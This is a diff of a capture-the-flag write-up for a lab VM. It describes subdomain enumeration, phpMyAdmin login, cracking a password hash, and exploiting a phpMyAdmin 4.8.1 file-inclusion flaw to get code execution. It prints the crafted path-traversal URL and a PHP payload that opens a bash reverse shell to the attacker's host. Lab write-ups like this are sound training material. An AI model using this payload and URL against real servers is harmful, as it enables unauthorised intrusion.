@@ -54,49 +54,52 @@ Four accessible files were detected during the enumeration phase:
 
 ## Exploiting
 
-Using Gobuster with the vhost option allows the discovery of subdomains. With the dictionary used (/dirbuster/wordlists/directory-list-2.3-medium.txt), a single subdomain was found: datasafe.votenow.local.
+Using Gobuster with the vhost option allows the discovery of subdomains. With the dictionary used (**`/dirbuster/wordlists/directory-list-2.3-medium.txt`**), a single subdomain was found: datasafe.votenow.local.
 
-The subdomain's web page features an access panel to "phpMyAdmin." By entering the previously obtained credentials, it is possible to log in and access a SQL database containing the hash of an admin user's password.
+Navigating to the subdomain's web page reveals an access panel for "phpMyAdmin". By entering the previously obtained credentials, the login is successful. Once logged in, the interface allows direct interaction with a SQL database through the execution of queries. From this database, it is possible to retrieve the hash of an admin user's password.
 
 The hash alone cannot be used, so John the Ripper, a password-cracking tool, is employed. Using the famous rockyou dictionary, the password corresponding to the hash is forced, revealing it to be "Stella".
 
 Browsing the page further, it is noted that the phpMyAdmin version is outdated, listed as 4.8.1 while the latest stable version is 4.9.5.
 
-Searchsploit, a tool for searching known exploits and vulnerabilities, reveals three vulnerabilities for this version, one of which allows command execution. 
+Searchsploit, a tool for searching known exploits and vulnerabilities, reveals three vulnerabilities for this version, one of which allows remote code execution. 
 
 ![Searchsploit response](images/searchsploit.png)
 
-Searchsploit provides detailed information about this vulnerability and how it can be exploited.
+Detailed information on how to exploit the RCE vulnerability is provided in response to the following searchsploit command:
+`searchsploit -x /php/webapps/50457.py`
+The exact same exploit is presented [here](https://www.exploit-db.com/exploits/50457).
 
-To exploit this vulnerability it is necessary to:
+As a first approximation the exploit steps in sequence are:
 1) authenticate
 2) obtain the phpMyAdmin cookie
-3) execute a SQL query on the web page
-4) accurately edit the URL.
+3) execute a SQL query
+4) accurately edit the URL and execute the payload.
    
 Authentication was done with the credentials obtained previously.
 
-The phpMyAdmin cookie can be obtained by using the browser inspector and seeing what the value of the cookie named phpMyAdmin is.
+The phpMyAdmin cookie can be obtained by inspecting the browser's developer tools to find the value of the cookie named phpMyAdmin.
 
-After authentication it is possible to execute sql queries on the databases present.
+Once authenticated it is possible to execute SQL queries on the databases present, so the point 3 can be easily done. The query must contain a php script within backticks, but in this stage it would not been executed. Under normal circumstances, the web application does not interpret or execute code placed within backticks in the SQL queries. However, by meticulously crafting the URL, it becomes possible to execute the script. This script embedded in the SQL query is the payload.
 
-Under normal circumstances, the web application does not interpret or execute code placed within backticks. However, by meticulously crafting the URL and embedding a PHP script within backticks in a SQL query, it becomes possible to execute the script.
+The URL must be edited to the following format:
 
-The URL must have the following format:
+**`http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{cookieValue}`**
 
-'http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{cookieValue}'
-
-where {cookieValue} is the current session's cookie value.
+replacing {cookieValue} with the current session's cookie value.
 
 By listening with a netcat listener on port 443 and injecting a SQL query like:
 
 `select '<?php system("bash -i >& /dev/tcp/10.0.2.4/443 0>&1");?>'`
 
-and structuring the URL as shown, a reverse shell is obtained on the presidential machine.
+and structuring the URL as shown, the embedded script within the query is executed, establishing a reverse shell on the target machine.
+
+The IP address **`10.0.2.4`** mentioned in the query is the Kali Linux machine's IP where the listener is active on port 443.
 
 ![Exploitation of the vulnerability](images/sql_vuln.png)
 
-Once the reverse shell is obtained, authentication on it can be done using the previously extracted admin user credentials.
+Following payload execution, a successful reverse shell is established. Authentication is accomplished using the previously obtained admin user credentials.
+Now it is possible to read the flag of **`user.txt`** and the file **`read.txt`**.
 
 ![Reverse shell connection and authentication](images/reverse_shell.png)
 
